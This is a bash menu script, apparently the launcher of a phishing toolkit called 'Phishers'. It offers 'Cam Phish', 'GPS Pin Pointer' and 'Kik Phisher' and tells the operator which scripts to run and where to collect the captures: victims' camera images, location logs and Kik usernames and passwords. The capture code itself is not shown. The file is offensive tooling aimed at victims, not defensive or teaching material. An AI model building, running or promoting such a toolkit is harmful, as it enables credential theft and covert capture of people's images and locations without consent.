#!/bin/bash

# ANSI escape codes for red text
RED='\033[0;31m'
NC='\033[0m'  # No color

# Clear the terminal
clear

# Display menu options
echo -e "                                                                         ${RED}________  ___  ___  ___  ________  ___  ___  _______   ________  ________ ${NC}"      
echo -e "                                                                         ${RED}|\   __  \|\  \|\  \|\  \|\   ____\|\  \|\  \|\  ___ \ |\   __  \|\   ____\ ${NC}"     
echo -e "                                                                         ${RED} \ \  \|\  \ \  \\\  \ \  \ \  \___|\ \  \\\  \ \   __/|\ \  \|\  \ \  \___|_${NC}"    
echo -e "                                                                         ${RED}  \ \   ____\ \   __  \ \  \ \_____  \ \   __  \ \  \_|/_\ \   _  _\ \_____  \ ${NC}"   
echo -e "                                                                         ${RED}   \ \  \___|\ \  \ \  \ \  \|____|\  \ \  \ \  \ \  \_|\ \ \  \\  \\|____|\  \ ${NC}"  
echo -e "                                                                         ${RED}     \ \__\    \ \__\ \__\ \__\____\_\  \ \__\ \__\ \_______\ \__\\ _\ ____\_\  \ ${NC}" 
echo -e "                                                                         ${RED}      \|__|     \|__|\|__|\|__|\_________\|__|\|__|\|_______|\|__|\|__|\_________\ ${NC}"
echo -e "                                                                         ${RED}                                \|_________|                           \|_________|${NC}"

echo -e "                                                                                                      ${RED}1. Cam Phish${NC}"
echo -e "                                                                                                      ${RED}2. GPS Pin Pointer${NC}"
echo -e "                                                                                                      ${RED}3. Kik Phisher      ${NC}"
echo -e "                                                                                                      ${RED}0. Exit${NC}"

# Read user input
read -p "                                                                                                           Choose an option: " choice

# Handle user input
case $choice in
    1)
        # Display a message and wait for user to press Enter
        echo -e "                                                                                                      ${RED}Start camphisher by saying cd tools/phishers and then bash camphish.sh${NC}"
        echo -e "                                                                                                      ${RED}Find the victims' imgs in cd tools/phishers/imgs${NC}"
        read -p "                                                                                                      ${RED}Press [Enter] to return to the menu or exit...${NC}"
        ;;
    2)
        # Display a message and wait for user to press Enter
        echo -e "                                                                                                      ${RED}Start GPS pin pointer by saying cd tools/phishers and then bash gps.sh${NC}"
        echo -e "                                                                                                      ${RED}Find the victims' logs in cd tools/phishers/ and then open logs.txt${NC}"
        read -p "                                                                                                      ${RED}Press [Enter] to return to the menu or exit...${NC}"
        ;;

    3)
        # Display a message and wait for user to press Enter
        echo -e "                                                                                                      ${RED}Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh${NC}"
        echo -e "                                                                                                      ${RED}Find the victim's user and password in cd tools/phishers/ and then open saved.txt${NC}"
        read -p "                                                                                                      ${RED}Press [Enter] to return to the menu or exit...${NC}"
        ;;
        
    0)
        # Exit the script
        echo -e "                                                                                                      Exiting..."
        exit 0
        ;;
    *)
        # Invalid choice
        echo -e "                                                                                                      Invalid choice, please enter 1 or 0."
        ;;
esac

# Optionally, you could loop the script to show the menu again after handling an option
exec "$0"
